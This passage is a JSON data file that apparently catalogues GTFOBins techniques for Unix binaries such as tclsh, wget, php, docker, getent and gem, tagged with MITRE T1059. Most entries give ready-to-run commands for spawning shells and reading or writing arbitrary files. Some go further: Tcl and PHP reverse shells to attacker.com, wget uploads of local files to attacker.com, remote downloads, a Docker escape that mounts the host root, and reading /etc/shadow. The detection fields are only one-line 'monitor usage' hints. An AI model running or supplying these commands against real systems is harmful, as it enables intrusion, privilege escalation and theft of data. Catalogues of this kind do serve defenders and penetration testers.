                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor zic usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/zic/"
                }
            ]
        },
        {
            "name": "ncdu",
            "description": "Unix binary ncdu.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "ncdu\nb"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ncdu usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ncdu/"
                }
            ]
        },
        {
            "name": "knife",
            "description": "Unix binary knife.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "knife exec -E '...'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor knife usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/knife/"
                }
            ]
        },
        {
            "name": "ntpdate",
            "description": "Unix binary ntpdate.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "ntpdate -a x -k /path/to/input-file -d localhost"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ntpdate usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ntpdate/"
                }
            ]
        },
        {
            "name": "passwd",
            "description": "Unix binary passwd.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "echo -e 'x\\nx' | passwd"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor passwd usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/passwd/"
                }
            ]
        },
        {
            "name": "tclsh",
            "description": "Unix binary tclsh.",
            "categories": [
                "execute",
                "reverse-shell",
                "shell"
            ],
            "commands": [
                {
                    "label": "LIBRARY-LOAD: ",
                    "code": "tclsh\nload /path/to/lib.so x"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "tclsh\nset s [socket attacker.com 12345];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;"
                },
                {
                    "label": "SHELL: ",
                    "code": "tclsh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tclsh usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tclsh/"
                }
            ]
        },
        {
            "name": "tmux",
            "description": "Unix binary tmux.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "tmux -f /path/to/input-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "tmux -c /bin/sh"
                },
                {
                    "label": "SHELL: ",
                    "code": "tmux -S /path/to/socket"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tmux usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tmux/"
                }
            ]
        },
        {
            "name": "arp",
            "description": "Unix binary arp.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "arp -v -f /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor arp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/arp/"
                }
            ]
        },
        {
            "name": "rlwrap",
            "description": "Unix binary rlwrap.",
            "categories": [
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "rlwrap -l /path/to/output-file echo DATA"
                },
                {
                    "label": "SHELL: ",
                    "code": "rlwrap /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rlwrap usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rlwrap/"
                }
            ]
        },
        {
            "name": "nl",
            "description": "Unix binary nl.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "nl -bn -w1 -s '' /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor nl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/nl/"
                }
            ]
        },
        {
            "name": "msgcat",
            "description": "Unix binary msgcat.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "msgcat -P /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor msgcat usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/msgcat/"
                }
            ]
        },
        {
            "name": "systemd-run",
            "description": "Unix binary systemd-run.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "systemd-run /path/to/command"
                },
                {
                    "label": "SHELL: ",
                    "code": "systemd-run -S"
                },
                {
                    "label": "SHELL: ",
                    "code": "systemd-run -t /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor systemd-run usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/systemd-run/"
                }
            ]
        },
        {
            "name": "wget",
            "description": "Unix binary wget.",
            "categories": [
                "execute",
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "wget http://attacker.com/path/to/input-file -O /path/to/output-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "wget -i /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "wget -i /path/to/input-file -o /path/to/output-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo -e '#!/bin/sh\\n/bin/sh 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\nwget --use-askpass=/path/to/temp-file 0"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "wget --post-file=/path/to/input-file http://attacker.com"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "wget --post-data=DATA http://attacker.com"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor wget usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/wget/"
                }
            ]
        },
        {
            "name": "ld.so",
            "description": "Unix binary ld.so.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "/path/to/ld.so /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ld.so usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ld.so/"
                }
            ]
        },
        {
            "name": "split",
            "description": "Unix binary split.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "split -b 999 --additional-suffix suffix /path/to/input-file prefix\ncat prefixaasuffix"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "split -b 999 --additional-suffix suffix /path/to/input-file prefix"
                },
                {
                    "label": "SHELL: ",
                    "code": "split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor split usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/split/"
                }
            ]
        },
        {
            "name": "jshell",
            "description": "Unix binary jshell.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "jshell\njshell> /open /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "jshell\nString x = \"DATA\";\n/save /path/to/output-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "jshell\nRuntime.getRuntime().exec(\"/path/to/command\");"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor jshell usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/jshell/"
                }
            ]
        },
        {
            "name": "nft",
            "description": "Unix binary nft.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "nft -f /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor nft usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/nft/"
                }
            ]
        },
        {
            "name": "shred",
            "description": "Unix binary shred.",
            "categories": [
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "shred -u /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor shred usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/shred/"
                }
            ]
        },
        {
            "name": "byebug",
            "description": "Unix binary byebug.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "byebug --no-stop /path/to/script.rb"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor byebug usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/byebug/"
                }
            ]
        },
        {
            "name": "alpine",
            "description": "Unix binary alpine.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "alpine -F /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor alpine usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/alpine/"
                }
            ]
        },
        {
            "name": "getent",
            "description": "Unix binary getent.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "getent shadow"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor getent usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/getent/"
                }
            ]
        },
        {
            "name": "docker",
            "description": "Unix binary docker.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "docker cp /path/to/input-file $CONTAINER_ID:input-file\ndocker cp $CONTAINER_ID:input-file /path/to/temp-file\ncat /path/to/temp-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA >/path/to/temp-file\ndocker cp /path/to/temp-file $CONTAINER_ID:temp-file\ndocker cp $CONTAINER_ID /path/to/output-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh"
                },
                {
                    "label": "SHELL: ",
                    "code": "docker run --rm -it --privileged -u root alpine\nmount /dev/sda1 /mnt/\nls -la /mnt/\nchroot /mnt /bin/bash"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor docker usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/docker/"
                }
            ]
        },
        {
            "name": "cabal",
            "description": "Unix binary cabal.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "cabal exec --project-file=/dev/null -- /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cabal usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cabal/"
                }
            ]
        },
        {
            "name": "neofetch",
            "description": "Unix binary neofetch.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "neofetch --ascii /path/to/input-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo 'exec /bin/sh' >/path/to/temp-file\nneofetch --config /path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor neofetch usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/neofetch/"
                }
            ]
        },
        {
            "name": "php",
            "description": "Unix binary php.",
            "categories": [
                "execute",
                "file-read",
                "file-write",
                "reverse-shell",
                "shell"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "php -r 'echo shell_exec(\"/path/to/command\");'"
                },
                {
                    "label": "COMMAND: ",
                    "code": "php -r '$r=array(); exec(\"/path/to/command\", $r); print(join(\"\\n\",$r));'"
                },
                {
                    "label": "COMMAND: ",
                    "code": "php -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(\"/path/to/command\", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'"
                },
                {
                    "label": "DOWNLOAD: ",
                    "code": "php -r '$c=file_get_contents(\"http://attacker.com/path/to/input-file\"); file_put_contents(\"/path/to/output-file\", $c);'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "php -r 'readfile(\"/path/to/input-file\");'"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "php -r 'file_put_contents(\"/path/to/output-file\", \"DATA\");'"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "php -r '$sock=fsockopen(\"attacker.com\",12345);exec(\"/bin/sh -i 0<&3 1>&3 2>&3\");'"
                },
                {
                    "label": "SHELL: ",
                    "code": "php -r 'system(\"/bin/sh -i\");'"
                },
                {
                    "label": "SHELL: ",
                    "code": "php -r 'passthru(\"/bin/sh -i\");'"
                },
                {
                    "label": "SHELL: ",
                    "code": "php -r '$h=@popen(\"/bin/sh -i\",\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'"
                },
                {
                    "label": "SHELL: ",
                    "code": "php -r 'pcntl_exec(\"/bin/sh\");'"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "php -S 0.0.0.0:80"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor php usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/php/"
                }
            ]
        },
        {
            "name": "qpdf",
            "description": "Unix binary qpdf.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file\nqpdf --show-attachment=x /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor qpdf usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/qpdf/"
                }
            ]
        },
        {
            "name": "batcat",
            "description": "Unix binary batcat.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "batcat --paging always /etc/hosts"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor batcat usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/batcat/"
                }
            ]
        },
        {
            "name": "journalctl",
            "description": "Unix binary journalctl.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "journalctl"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor journalctl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/journalctl/"
                }
            ]
        },
        {
            "name": "gem",
            "description": "Unix binary gem.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "gem open debug"
                },
                {
                    "label": "INHERIT: ",
                    "code": "gem build /path/to/script.rb"
                },
                {
                    "label": "INHERIT: ",
                    "code": "gem install --file /path/to/script.rb"
                },
                {
                    "label": "SHELL: ",
                    "code": "gem open -e '/bin/sh -s' debug"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor gem usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/gem/"
                }
            ]
        }
    ]
};